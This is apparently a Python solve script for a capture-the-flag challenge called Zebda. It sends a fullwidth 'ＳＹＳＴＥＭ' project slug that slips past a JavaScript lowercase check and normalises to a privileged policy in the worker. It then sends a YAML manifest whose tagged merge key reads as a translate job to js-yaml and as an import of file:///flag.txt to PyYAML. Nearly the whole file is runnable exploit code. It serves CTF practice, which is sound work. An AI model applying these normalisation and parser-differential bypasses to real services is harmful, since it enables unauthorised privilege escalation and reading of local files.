#!/usr/bin/env python3
"""Solve L3akCTF 2026's Zebda parser-differential challenge.

The middleware rejects the ASCII names ``system`` and ``admin`` using
JavaScript lowercasing.  The worker applies NFKC normalization and casefolding,
so the fullwidth spelling below reaches the worker as the privileged
``system`` policy.  The YAML manifest then looks like a translate job to
js-yaml, but PyYAML resolves the tagged merge key to an import job.

Usage:
    python3 solve.py http://127.0.0.1/
    python3 solve.py https://authorized-instance.example/
"""

import argparse
import json
import ssl
import urllib.error
import urllib.request


PRIVILEGED_SPELLING = "ＳＹＳＴＥＭ"
MANIFEST = """a: &a {action: translate, source: https://example.com}
b: &b {action: import, source: file:///flag.txt}
job:
  <<: *a
  ? !!merge '<<'
  : *b
"""


def post_json(url, body, content_type, context):
    request = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": content_type},
    )
    try:
        with urllib.request.urlopen(request, timeout=15, context=context) as response:
            return response.status, json.loads(response.read().decode())
    except urllib.error.HTTPError as error:
        detail = error.read().decode(errors="replace")
        raise RuntimeError(f"HTTP {error.code} from {url}: {detail}") from error
    except urllib.error.URLError as error:
        raise RuntimeError(f"Could not reach {url}: {error.reason}") from error


def solve(base_url, insecure=False):
    base_url = base_url.rstrip("/")
    context = ssl._create_unverified_context() if insecure else None

    status, project = post_json(
        f"{base_url}/api/projects",
        json.dumps({"slug": PRIVILEGED_SPELLING}).encode(),
        "application/json",
        context,
    )
    if status != 201 or not project.get("id"):
        raise RuntimeError(f"Project creation failed ({status}): {project}")
    project_id = project["id"]
    print(f"[+] created project {project_id} with slug {PRIVILEGED_SPELLING!r}")

    status, build = post_json(
        f"{base_url}/api/projects/{project_id}/builds",
        MANIFEST.encode(),
        "text/yaml",
        context,
    )
    if status != 201 or build.get("status") != "success":
        raise RuntimeError(f"Build failed ({status}): {build}")

    artifact = build.get("artifact")
    if not artifact:
        raise RuntimeError(f"Build succeeded without an artifact: {build}")
    print(f"[+] artifact: {artifact}")
    return artifact


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("base_url", help="authorized Zebda base URL")
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="disable TLS certificate verification for a local test endpoint",
    )
    args = parser.parse_args()
    solve(args.base_url, insecure=args.insecure)


if __name__ == "__main__":
    main()
